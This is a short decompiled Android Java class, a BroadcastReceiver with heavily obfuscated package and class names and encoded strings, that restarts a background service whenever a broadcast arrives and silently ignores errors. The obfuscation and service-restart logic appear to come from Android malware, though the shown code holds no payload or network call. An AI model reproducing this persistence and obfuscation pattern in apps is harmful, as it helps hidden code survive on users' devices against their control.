package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0044c;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
/* loaded from: classes.dex */
public class hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74 extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        try {
            if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
                oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.m212p("-25ᴵיˎᵔᵢﹶᴵʻ5", "ᴵיˎᵔᵢﹶᴵʻ"), String.valueOf(C0045d.f209x).getBytes());
            }
        } catch (Exception unused) {
        }
        try {
            if (C0044c.m239g(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class, context)) {
                if (Build.VERSION.SDK_INT < 26 || !C0045d.m222f()) {
                    context.startService(new Intent(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class));
                } else {
                    context.startForegroundService(new Intent(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class));
                }
            }
        } catch (Exception unused2) {
        }
    }
}
